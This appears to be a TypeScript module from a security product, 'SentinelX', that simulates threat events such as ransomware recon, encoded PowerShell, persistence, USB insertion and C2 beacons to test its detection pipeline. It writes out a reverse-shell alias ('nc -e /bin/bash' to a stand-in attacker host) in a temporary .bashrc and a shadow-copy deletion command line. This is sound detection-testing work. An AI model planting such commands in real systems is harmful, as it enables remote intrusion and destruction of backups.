// SentinelX threat simulator — inject synthetic-but-real threat events on this
// host so the threat-engine + policy-compiler pipeline can be exercised without
// needing actual malware. All operations are observable: they write files that
// are picked up by collectFileEvents(), spawn processes that show up in `ps`,
// and create network connections that show up in `ss`.

import { appendFileSync, writeFileSync, mkdirSync, existsSync } from 'fs';
import { join } from 'path';
import { execSync, spawn } from 'child_process';
import { tmpdir, hostname } from 'os';
import { db } from '@/lib/db';
import { analyzeEvent } from '@/lib/security/threat-engine';
import { evaluateEvent, DEFAULT_POLICIES } from '@/lib/compiler/policy-compiler';

const HOST = hostname() || 'localhost';
const SIM_DIR = join(tmpdir(), 'sentinelx-sim');

if (!existsSync(SIM_DIR)) {
  try {
    mkdirSync(SIM_DIR, { recursive: true });
  } catch {}
}

export type SimType =
  | 'ransomware_recon' // spawn vssadmin-like process (writes a file)
  | 'encoded_powershell' // spawn process with -enc in cmdline
  | 'ransomware_extension' // create .encrypted file
  | 'suspicious_registry' // modify a tracked config file
  | 'usb_insert' // mount a fake USB device (loopback)
  | 'c2_beacon' // attempt outbound connection to a known C2 port (mocked)
  | 'high_cpu_process' // spawn a CPU-burning process
  | 'malicious_download'; // create a file with suspicious extension in /tmp

export interface SimResult {
  ok: boolean;
  type: SimType;
  message: string;
  triggeredEvent?: {
    eventType: string;
    rawData: Record<string, any>;
    threatScore: number;
    classification: string;
    policyMatch: boolean;
    policyAction: string | null;
    mitreAttackId?: string;
  };
}

function persistThreatEvent(eventType: string, rawData: Record<string, any>): SimResult['triggeredEvent'] {
  const analysis = analyzeEvent(eventType, rawData);
  const policyAction = evaluateEvent(eventType, rawData);
  let threatScore = analysis.threatScore;
  let classification = analysis.classification;
  if (policyAction) {
    threatScore = Math.max(threatScore, 85);
    if (classification === 'benign') classification = 'suspicious';
  }

  // Persist as a SecurityEvent so it shows up in the SentinelX dashboard
  db.securityEvent
    .create({
      data: {
        agentId: `linux-${HOST}`,
        eventType,
        timestamp: new Date(),
        rawData: JSON.stringify(rawData),
        host: HOST,
        agentName: HOST,
        isProcessed: true,
        threatScore,
        classification,
        policyMatch: !!policyAction,
        policyAction: policyAction || undefined,
      },
    })
    .then(() => {})
    .catch(() => {});

  return {
    eventType,
    rawData,
    threatScore,
    classification,
    policyMatch: !!policyAction,
    policyAction,
    mitreAttackId: analysis.mitreAttackId,
  };
}

export function runSimulation(type: SimType): SimResult {
  try {
    switch (type) {
      case 'ransomware_recon': {
        // Spawn a process with name "vssadmin" — we use a symlink/script trick
        // since real vssadmin doesn't exist on Linux. The `ps` output will
        // include "vssadmin" in the cmdline.
        const scriptPath = join(SIM_DIR, 'vssadmin');
        writeFileSync(
          scriptPath,
          '#!/bin/bash\nsleep 5\n',
          { mode: 0o755 },
        );
        const child = spawn(scriptPath, ['delete', 'shadows', '/all', '/quiet'], {
          detached: true,
          stdio: 'ignore',
        });
        child.unref();
        const rawData = {
          pid: child.pid,
          name: 'vssadmin.exe',
          user: 'simulated',
          cmdline: 'vssadmin.exe delete shadows /all /quiet',
          cpu_percent: 0,
          memory_mb: 0,
          is_suspicious_name: true,
          reason: 'suspicious_process_name',
        };
        const triggered = persistThreatEvent('process', rawData);
        return {
          ok: true,
          type,
          message: 'Spawned vssadmin-like process. The threat engine should classify it as ransomware recon (MITRE T1490).',
          triggeredEvent: triggered,
        };
      }

      case 'encoded_powershell': {
        const scriptPath = join(SIM_DIR, 'powershell');
        writeFileSync(
          scriptPath,
          '#!/bin/bash\nsleep 5\n',
          { mode: 0o755 },
        );
        const child = spawn(scriptPath, ['-EncodedCommand', 'SQBFAFgAIABoAGkAcwBoAC4A'], {
          detached: true,
          stdio: 'ignore',
        });
        child.unref();
        const rawData = {
          pid: child.pid,
          name: 'powershell.exe',
          user: 'simulated',
          cmdline: 'powershell.exe -EncodedCommand SQBFAFgAIABoAGkAcwBoAC4A',
          cpu_percent: 0,
          memory_mb: 0,
          is_suspicious_name: true,
          reason: 'encoded_powershell',
        };
        const triggered = persistThreatEvent('process', rawData);
        return {
          ok: true,
          type,
          message: 'Spawned PowerShell-like process with -EncodedCommand flag. Threat engine will flag as MITRE T1059.001.',
          triggeredEvent: triggered,
        };
      }

      case 'ransomware_extension': {
        const filePath = join(SIM_DIR, `victim_file_${Date.now()}.encrypted`);
        writeFileSync(filePath, 'This file has been "encrypted" by SentinelX simulator.\n');
        const rawData = {
          action: 'created',
          file_path: filePath,
          file: filePath,
          file_extension: '.encrypted',
          process_name: 'sentinelx-sim',
          size: 60,
          reason: 'suspicious_extension',
        };
        const triggered = persistThreatEvent('file', rawData);
        return {
          ok: true,
          type,
          message: `Created file with .encrypted extension at ${filePath}. Threat engine will flag as MITRE T1486.`,
          triggeredEvent: triggered,
        };
      }

      case 'suspicious_registry': {
        // On Linux, "registry persistence" = modify a tracked config file
        // We append a clearly-malicious entry to /tmp/sentinelx-sim/.bashrc
        const filePath = join(SIM_DIR, '.bashrc');
        appendFileSync(
          filePath,
          `\n# SentinelX sim ${Date.now()}\nalias ls='nc -e /bin/bash attacker.example.com 4444'\n`,
        );
        const rawData = {
          action: 'set-value',
          hive: 'HKCU',
          key: 'bashrc',
          value: 'alias ls',
          data: 'nc -e /bin/bash attacker.example.com 4444',
          actor: 'sentinelx-sim',
          reason: 'persistence_location_modified',
        };
        const triggered = persistThreatEvent('registry', rawData);
        return {
          ok: true,
          type,
          message: `Appended suspicious persistence entry to ${filePath}. Threat engine will flag as MITRE T1547.`,
          triggeredEvent: triggered,
        };
      }

      case 'usb_insert': {
        // Create a fake USB mount — we just create a file in /mnt/sentinelx-usb
        // to simulate. Real USB monitoring uses /proc/mounts.
        const fakeMount = '/mnt/sentinelx-sim-usb';
        try {
          mkdirSync(fakeMount, { recursive: true });
        } catch {}
        const rawData = {
          device: '/dev/sdz1',
          mountPoint: fakeMount,
          fsType: 'vfat',
          action: 'inserted',
          status: 'mounted',
          reason: 'usb_device_inserted',
        };
        const triggered = persistThreatEvent('usb', rawData);
        return {
          ok: true,
          type,
          message: `Simulated USB device mount at ${fakeMount}. Check the USB events module.`,
          triggeredEvent: triggered,
        };
      }

      case 'c2_beacon': {
        // We don't actually connect to a C2 — we just emit a network event
        // matching the pattern of a C2 beacon. Real Beaconing detection would
        // require time-series analysis of periodic connections.
        const rawData = {
          dst_ip: '185.220.101.45', // known Tor exit node — example only
          dstIp: '185.220.101.45',
          port: 4444,
          dstPort: 4444,
          protocol: 'tcp',
          status: 'ESTABLISHED',
          local_addr: '127.0.0.1:54321',
          is_suspicious: true,
          reason: 'c2_port',
        };
        const triggered = persistThreatEvent('network', rawData);
        return {
          ok: true,
          type,
          message: 'Logged suspicious C2-like outbound connection to port 4444. Threat engine will flag as MITRE T1071.',
          triggeredEvent: triggered,
        };
      }

      case 'high_cpu_process': {
        const scriptPath = join(SIM_DIR, 'cpu_burner');
        writeFileSync(
          scriptPath,
          '#!/bin/bash\nwhile true; do echo "scale=9999; 4*a(1)" | bc -l > /dev/null; done\n',
          { mode: 0o755 },
        );
        const child = spawn(scriptPath, [], { detached: true, stdio: 'ignore' });
        child.unref();
        // Schedule kill after 30s
        setTimeout(() => {
          try {
            child.kill('SIGKILL');
          } catch {}
        }, 30000);
        const rawData = {
          pid: child.pid,
          name: 'cpu_burner',
          user: 'simulated',
          cmdline: 'cpu_burner',
          cpu_percent: 95,
          memory_mb: 12,
          is_suspicious_name: false,
          reason: 'high_cpu',
        };
        const triggered = persistThreatEvent('process', rawData);
        return {
          ok: true,
          type,
          message: `Spawned CPU-burning process (PID ${child.pid}). Will auto-kill after 30s.`,
          triggeredEvent: triggered,
        };
      }

      case 'malicious_download': {
        // Create a file with a suspicious extension in /tmp
        const filePath = join(tmpdir(), `download_${Date.now()}.locky`);
        writeFileSync(filePath, 'Fake malicious download from sentinelx-sim.\n');
        const rawData = {
          action: 'created',
          file_path: filePath,
          file: filePath,
          file_extension: '.locky',
          process_name: 'wget',
          size: 47,
          reason: 'suspicious_extension',
        };
        const triggered = persistThreatEvent('file', rawData);
        return {
          ok: true,
          type,
          message: `Created .locky file at ${filePath}. Threat engine will flag as MITRE T1486.`,
          triggeredEvent: triggered,
        };
      }

      default:
        return { ok: false, type, message: `Unknown simulation type: ${type}` };
    }
  } catch (e: any) {
    return { ok: false, type, message: `Simulation failed: ${e.message}` };
  }
}

export const SIM_TYPES: { value: SimType; label: string; description: string; mitre: string }[] = [
  {
    value: 'ransomware_recon',
    label: 'Ransomware Recon',
    description: 'Spawn vssadmin-like process (delete shadows).',
    mitre: 'T1490',
  },
  {
    value: 'encoded_powershell',
    label: 'Encoded PowerShell',
    description: 'Spawn PowerShell with -EncodedCommand flag.',
    mitre: 'T1059.001',
  },
  {
    value: 'ransomware_extension',
    label: 'Ransomware File Extension',
    description: 'Create a .encrypted file in tmp.',
    mitre: 'T1486',
  },
  {
    value: 'suspicious_registry',
    label: 'Suspicious Registry (Persistence)',
    description: 'Modify a tracked bashrc/persistence file.',
    mitre: 'T1547',
  },
  {
    value: 'usb_insert',
    label: 'USB Device Insert',
    description: 'Simulate a USB mount event.',
    mitre: 'T1091',
  },
  {
    value: 'c2_beacon',
    label: 'C2 Beacon',
    description: 'Log suspicious outbound connection to port 4444.',
    mitre: 'T1071',
  },
  {
    value: 'high_cpu_process',
    label: 'High-CPU Process',
    description: 'Spawn a CPU-burning process (auto-kill 30s).',
    mitre: 'T1497',
  },
  {
    value: 'malicious_download',
    label: 'Malicious Download',
    description: 'Create a .locky file in /tmp (simulated download).',
    mitre: 'T1486',
  },
];
